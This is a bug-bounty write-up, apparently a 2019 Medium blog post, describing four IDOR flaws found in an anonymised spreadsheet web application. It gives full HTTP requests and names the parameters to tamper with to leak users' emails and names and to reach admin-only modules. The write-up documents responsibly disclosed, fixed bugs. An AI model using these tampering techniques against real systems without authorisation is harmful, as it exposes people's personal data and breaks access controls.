---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-16_inf0rmtion-disclosure-via-idor.md
original_filename: 2019-12-16_inf0rmtion-disclosure-via-idor.md
title: Inf0rM@tion Disclosure via IDOR
category: documents
detected_topics:
- idor
- access-control
- command-injection
- automation-abuse
- information-disclosure
- business-logic
tags:
- imported
- documents
- idor
- access-control
- command-injection
- automation-abuse
- information-disclosure
- business-logic
language: en
raw_sha256: 7799ec425c108a639ae6ed81a9638b2289667efb23743e8b6a0436f5b8ad72c5
text_sha256: ca849ed45e7d8dab1e1f04e80f79f8da2aac0cd0a69b70ecde3da6fa5b61d091
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Inf0rM@tion Disclosure via IDOR

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-16_inf0rmtion-disclosure-via-idor.md
- Source Type: markdown
- Detected Topics: idor, access-control, command-injection, automation-abuse, information-disclosure, business-logic
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `7799ec425c108a639ae6ed81a9638b2289667efb23743e8b6a0436f5b8ad72c5`
- Text SHA256: `ca849ed45e7d8dab1e1f04e80f79f8da2aac0cd0a69b70ecde3da6fa5b61d091`


## Content

---
title: "Inf0rM@tion Disclosure via IDOR"
url: "https://medium.com/@pratyush1337/inf0rm-tion-disclosure-via-idor-cff5541a9232"
authors: ["Pratyush Anjan Sarangi"]
bugs: ["IDOR"]
bounty: "750"
publication_date: "2019-12-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4884
scraped_via: "browseros"
---

# Inf0rM@tion Disclosure via IDOR

Inf0rM@tion Disclosure via IDOR
Pratyush Anjan Sarangi
Follow
7 min read
·
Dec 16, 2019

183

Three Duplicates & a Final BLOW!

Press enter or click to view image in full size
Information Disclosure @ IDOR
1. IDOR Vulnerability Exposing Critical Information Disclosure

I was looking for some P1-P2 bugs and found this xyzcompany program is public in bugcrowd(Now it has become Private).

I have created an Admin account and following is the request where I encountered my 1st IDOR in this web application.

POST /b/home?formName=webop&formAction=GetSheetHistoryDetails&sk=yiYH_Bj0zZ_UDTnfLZ-9Dc23_MQ&to=68000&ss_v=72.0.4 HTTP/1.1
Host: app.xyzcompany.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 202
Cookie: <cookies>
Connection: close
{"detailType":"share_delete","eer":"S634694601","ier":1549343307000,"qih":276632578,"userId":28752022,"containerType":3,"properties":{"newAccessLevel":"0","containerID":"106635283","userID":"28752022"}}

The “userId” parameter was vulnerable to IDOR! If we change the userId than it was showing out Email addresses and Names of all the registered Users in the Activity Log of the web application.

Press enter or click to view image in full size
Info Disclosure via IDOR
Press enter or click to view image in full size
Info Disclosure via IDOR
Press enter or click to view image in full size
Info Disclosure via IDOR

Epically Done!

2. IDOR Vulnerability Disclosing All Registered Email Address

One bug is reported now and as it’s an IDOR ,I thought P2 max reward is 1500. Let’s check other end-points if i find any thing else….

POST /b/home?formName=webop&formAction=GetAutomationRecipientStatus&sk=yiYH_Bj0zZ_UDTnfLZ-9Dc23_MQ&to=68000&ss_v=72.0.4 HTTP/1.1
Host: app.xyzcompany.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 45
Cookie:<Cookies>
Connection: close
{"gridID":276644877,"Sae":[32310136,12310136,22310136,32140136],"$Q":[]}

While intercepting the approval request , if we edit the “sae” parameter and add as many parameters(HPP remember?) we want than the web application is dumping out all the email addresses. Damn Cool right?

POC Images:

Press enter or click to view image in full size
Email Disclosure via Notification pop-up
Press enter or click to view image in full size
Email Disclosure via Notification pop-up

Found 2 IDOR’s , I was like am i dreaming? In a public program huhhh???

Press enter or click to view image in full size

Epically Done!

3. IDOR Vulnerability Exposing Emails in SendAsAttachment Functionality

So, I was thinking , It was a public program and i found 2 IDOR’s! Maybe i have Underestimated my capability of hunting in public program. There was an adrenaline rush in me, Let’s find more!

1st Request:
POST /b/home?formName=ajax&formAction=fa_scheduledUpdateSave&ss_v=72.0.5 HTTP/1.1
Host: app.xyzcompany.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-type: application/x-www-form-urlencoded
xyzcompany-nep: formName,formAction,sk,to,ccid,parm1,parm2,parm3
Content-Length: 721
Cookie:<Cookies>
Connection: close
formName=ajax&formAction=fa_scheduledUpdateSave&sk=5fLsqyRBHV1Yizprh4nkF9VUmh0&to=68000&ccid=aae0ad01-0a50-4996-9f5c-08a69bfb17b5&parm1=scheduledUpdate&parm2=[{"t":"scheduledUpdate","28":"-79","29":"1","30":"grid","31":"277823642","32":"asdasd","33":"I\u0027ve+attached+a+copy+of+my+sheet+for+your+review.","34":"4"},{"t":"scheduledUpdateUser","51":"-80","52":"-79","53":"1","54":"37154090","55":"1"},{"t":"recurrence","369":"-81","370":"1","371":"-79","372":"0"},{"t":"outputConfiguration","248":"-82","249":"scheduledUpdate","250":"-79","251":"1","252":"0","255":"7","256":"3","257":"100","258":"4","259":"0","261":"false","262":"true","263":"true","264":"true","265":"true","266":"true","267":"false"}]&parm3=[]&parm4=2nd Request:POST /b/home?formName=ajax&formAction=fa_cancelScheduledUpdateRequest&ss_v=72.0.5 HTTP/1.1 
Host: app.xyzcompany.com 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: */* Accept-Language: en-US,en;q=0.5 
Content-type: application/x-www-form-urlencoded 
xyzcompany-nep: formName,formAction,sk,to,ccid,parm1 
Content-Length: 174 
Cookie: <cookies> 
Connection: close  formName=ajax&formAction=fa_cancelScheduledUpdateRequest&sk=5fLsqyRBHV1Yizprh4nkF9VUmh0&to=68000&ccid=aae0ad01-0a50-4996-9f5c-08a69bfb17b5&parm1=24928396&parm2=&parm3=&parm4=

This is the Delete request(2nd Request) which is very Important because here , if we tamper “parm1=<any numeric value less than the generated value of web application>” and it will feed us the email ids of other users.

Just to be clear, There is no IDOR bug in using the 1st requests but when i was trying to delete the email i sent(2nd Request) , if I temper the parm1 than the web app was fetching the email id of all the registered users from the Database ;)

Tip: Just don’t look out for parameter tampering or manipulating numeric values. Try to look into different functionality which uses same parameters!

Image POC:

Press enter or click to view image in full size
IDOR Vulnerability Exposing Emails in SendAsAttachment
Press enter or click to view image in full size
IDOR Vulnerability Exposing Emails in SendAsAttachment
Press enter or click to view image in full size

Epically Done!

Get Pratyush Anjan Sarangi’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Damn it! Three P2 Bugs Dups! I was hopeless now!So, After getting this much of disappointment, I was too much upset…

What to do ? should i give up on this web app? Why to waste more time if every bug i report will be a duplicate of one single bug reported by another researcher. According to xyzcompany , the whole issues on different end points will be fixed if we fix the one bug which was reported to them 7–8 months ago. I was like What the Heck? A bug was not patched for 7–8 Months but the researcher was rewarded with $1500(P2). I know this because i ask them to disclose that bug details to me. I was provided with the required information. I checked and found that one of them could be a duplicate of that bug but other two should not have been duplicates as the end points are different and also that the Tampering parameters in those endpoints are totally different. I thought that this is absolutely absurd to waste more time on this program.

The Functionality affected by IDORs:

Press enter or click to view image in full size

I was thinking of giving up! , but than i thought of giving a last look to see if i can get anything….Usually i don’t give up that easy.

4. IDOR Vulnerability Leading to Privilege Escalation within the Organization

The final BLOW!

So This Bug was really unusual! I created an Admin account and added a user as Regular User with Restricted Access. Usually with the above tittle to this Bug you might be thinking that there will be a regular user and an Admin user and Regular User will be able to access endpoints that was suppose to be accessed by Admin only. But that is not the case , It’s a twisted bug , never seen such behavior from a web application.

POST /b/home?formName=ajax&formAction=fa_loadOrgAdminEmails&ss_v=72.0.7 HTTP/1.1
Host: app.xyzcompany.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-type: application/x-www-form-urlencoded
xyzcompany-nep: formName,formAction,sk,to,ccid,parm1
Content-Length: 163
Cookie:<cookies>
DNT: 1
Connection: close
formName=ajax&formAction=fa_loadOrgAdminEmails&sk=QejRv5Cw8mTNwAqUOeOq8ULa_Nc&to=68000&ccid=d5b34018-65a2-4115-8e69-b21dcd6dd6ad&parm1=1327595&parm2=&parm3=&parm4=

Just Tamper the “parm1” to any numeric value , it won’t give out other user’s detail but rather it will temporarily allow a Restricted User to Access Functional Module that could be only accessed by an Admin.

To View the user management and see all the users managed by admin account , the important thing you need to do is to add the user in Admin account and wait for 1hr 30mins so that it will be properly registered in the Data-Base and after that you can perform the above Attack to see the group management and user management managed by Admin Account.

Image POC: This is the Permission to a Restricted Access User.

Press enter or click to view image in full size

After the IDOR Trick!

Press enter or click to view image in full size

Unusual Behavior

Now I can see that I am able to see the User management & Group management functional Module in Restricted User Accounts but it should disclose information to be a valid bug so i checked on those function to see if it shows the information.

Press enter or click to view image in full size
Group Management Functional Module
Press enter or click to view image in full size
User Management Functional Module

So , I thought , Let’s report it and get another Duplicate ;)

Huh! Triaged again to get Duplicate Later!

I thought , yeah! ok , They have Triaged now as usual and will get Duplicate later as all the other 3 Bugs was Triaged in the first sight and closed as Duplicate later!

They made it P4 and i thought , $250 What the Heck if i get or not! Let’s start hunting in some other site. I left it for few days. Than i got a response from xyzcompany team:

Damn! A shinning Hope!

So , After seeing this , I was like , Damn they are taking this bug seriously. P3 huh!!! So max I can get is $750 , I was happy!

After few Days , They closed this bug and Rewarded me!

Suggestion: Don’t always think IDOR as a bug that will disclose information/Takeover Accounts , sometimes it provide Privilege Escalation / Behavioural Issues in a Web application. Always look for changes in the content of a web application to see if the Trick worked or not.

Timeline:

Feb. 08, 2019 — Initial Report
Feb. 08, 2019 — Report Triaged
Feb. 19, 2019 — Bug Fixed and Rewarded
